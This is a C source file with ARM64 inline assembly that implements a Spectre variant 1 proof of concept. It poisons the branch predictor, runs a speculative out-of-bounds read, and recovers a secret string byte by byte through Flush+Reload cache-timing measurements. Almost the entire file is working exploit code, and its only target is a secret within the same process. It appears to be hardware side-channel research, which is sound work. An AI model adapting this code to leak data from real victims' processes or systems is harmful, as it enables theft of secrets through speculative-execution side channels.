#include <stdio.h>
#include <stdlib.h> 
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include "utils.h"

#define STRIDE 4096
#define RELOAD_BUF_SIZE STRIDE * 256
#define ITER 100

#define MOV(n)	\
	asm volatile(	\
		".rept %0\n" \
		"mov x10, x10\n" \
		".endr\n"	\
		::"i" (n): "x10" \
	)

#define NOPS(n) \
    asm volatile( \
        ".rept %0\n" \
        "nop\n" \
        ".endr\n" \
        :: "i" (n) \
    )

#define EORS(n) \
    asm volatile( \
        ".rept %0\n" \
        "eor x10, x10, #1\n" \
        ".endr\n" \
        :: "i" (n) \
		:"x10" \
    )

#define ADDS(n) \
    asm volatile( \
        ".rept %0\n" \
        "adds x10, x10, #1\n" \
        ".endr\n" \
        :: "i" (n) \
		:"x10" \
    )

#define REPEAT_16(x)  x x x x x x x x x x x x x x x
#define REPEAT_8(x)  x x x x x x x x

static unsigned int size __attribute__((aligned(4096))) = 16;
static unsigned int *size_ptr1 = &size;
static unsigned int **size_ptr2 = &size_ptr1;
static unsigned int ***size_ptr3 = &size_ptr2;
static unsigned int ****size_ptr4 = &size_ptr3;
static unsigned int *****size_ptr5 = &size_ptr4;
static unsigned int ******size_ptr6 = &size_ptr5;
static unsigned int *******size_ptr7 = &size_ptr6;
static unsigned int ********size_ptr8 = &size_ptr7;
static unsigned int *********size_ptr9 = &size_ptr8;
static unsigned int **********size_ptr10 = &size_ptr9;
static unsigned int ***********size_ptr11 = &size_ptr10;
static unsigned int ************size_ptr12 = &size_ptr11;
static unsigned int *************size_ptr13 = &size_ptr12;
uint8_t fake_buffer[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t *reloadbuffer;
unsigned char *memory;
char *secret = "SPECTRE_EXECUTE!";
static unsigned char data __attribute__((aligned(4096))) = 32;
static volatile uint8_t pick = 0; 

/*
 * Measure the latency: check whether dco kicks in
 */


static inline  __attribute__((always_inline)) void spectre_v1( size_t index) {
//	volatile size_t dummy = *************size_ptr13;
	asm volatile("movi d0, #0\n\r");
#ifdef N
	MOV(N);
#endif
	cacheflush(&size);
	asm volatile(
		"mov x2, #0\n\r"
		"mov x3, #0\n\r"
		"mov x4, #0\n\r"
		"mov x5, #0\n\r"
		:::"x2"
	);
//	dummy = *************size_ptr13;
	isb();

	/*
	 * Spectre v1 runahead
	 */
	
//	pick = fake_buffer[index];
//	for(int i = 0; i < 1024; i++){
//		pick = memory[i * 64];
//	}
//	asm volatile("mov x2, #0\n\r");
//	if (index < *************size_ptr13)
	if(index < size)
	{	
		asm volatile (
//			"fcvtzs x2, d0\n\r"
//			"adds %[index], %[index], x2\n\r"
//			"mov x2, #0\n\r"
			".rept 100\n\r"
//			"eor %[index], %[index], x2\n\r" 
			"eor x2, x2, #1\n\r"
			"eor x5, x5, x2\n\r"
			"eor x3, x3, x5\n\r"
			"eor x4, x4, x3\n\r"
			".endr\n\r"
			"add %[index], %[index], x4\n\r"
    		: [index] "+r" (index)        
    		:                            
    		: "x2", "x3", "x4", "x5"                      
		);
		pick = reloadbuffer[fake_buffer[index] << 12];
	}
}

static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *byte) {
	int index, max = 0;
	size_t train_index, probe_addr;
	int results[256];
	int hit = 0;


	int random_int;
	uint64_t init, end;

	memset(results, 0 , sizeof(int) * 256);
	for (int tries = ITER; tries > 0; tries--) {

		/*
		 * flush reload buffer
		 */
		for (int i = 0; i < 256; i++)
			cacheflush(&reloadbuffer[i * STRIDE]); 

		train_index = tries % size;
		for (int j = 0; j <= 10; j++) {

			/*
			 *poison branch predictor
			 */
			random_int = random(5, 7);
			probe_addr = ((j % random_int) - 1) & 0xFFFFFFFFFFFFFF00; 
			probe_addr = (probe_addr | (probe_addr >> 8)); 
			probe_addr = train_index ^ (probe_addr & (target ^ train_index));
//			cacheflush(&data);
//			cacheflush(&size);
			for(volatile int z = 0; z < 100; z++){}
			isb();
			EORS(300);
			//pick = data;
			spectre_v1(probe_addr);
		}

		/*
		 * reload reload buffer 
		 */
		for (int i = 0; i < 256; i++)
		{
			index = ((i * 167) + 13) & 255;  // mixed access order

			isb();
			init = get_cycles();
			pick = reloadbuffer[index * STRIDE];
			end = get_cycles();
			isb();
			if (end - init <= 190 && index != fake_buffer[tries % size])
				results[index]++; 
		}

	}

	max = results[0];
	for(int m = 0; m < 256; m++){
		if(results[m] > max){
			max = results[m];
			hit = m;
		}
	}
	printf("cache hit: %c, %x\n", (uint8_t)hit, hit);
	*byte = (uint8_t)hit;
}

int main(int argc, const char * * argv) {
	reloadbuffer = (unsigned char *)mmap(0, RELOAD_BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	memory = (unsigned char *)mmap(0, 64 * 1024, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);

	size_t offset = (size_t)(secret - (char *)fake_buffer);
	int secret_len = strlen(secret);
	uint8_t byte;
	memset(reloadbuffer, 1, sizeof(uint8_t) * RELOAD_BUF_SIZE);
	memset(memory, 1, sizeof(unsigned char) * 64 * 1024);

	uint8_t *leaked = (uint8_t *)malloc(sizeof(uint8_t) * secret_len);


//	for(int i = 0; i < secret_len; i++)
//	{
//		leak(offset + i, &byte);
//		leaked[i] = byte;
//	}
	
	/*
	 * Repeat 16 times, avoid using loops
	 */
	int i =  0;
	REPEAT_16(
		leak(offset + i, &byte);
		leaked[i] = byte;
		i = i + 1;		
	);

	for(int i = 0; i < secret_len; i++){
		printf("%c", leaked[i]);
	}
	printf("\n");
	
	int correct = 0;
	for(int i = 0; i < 16; i++){
		if(leaked[i] == secret[i]){
			correct ++;
		}
	}

	//printf("%d\n", correct);
	free(leaked);
	leaked = NULL;
	return 0;
}
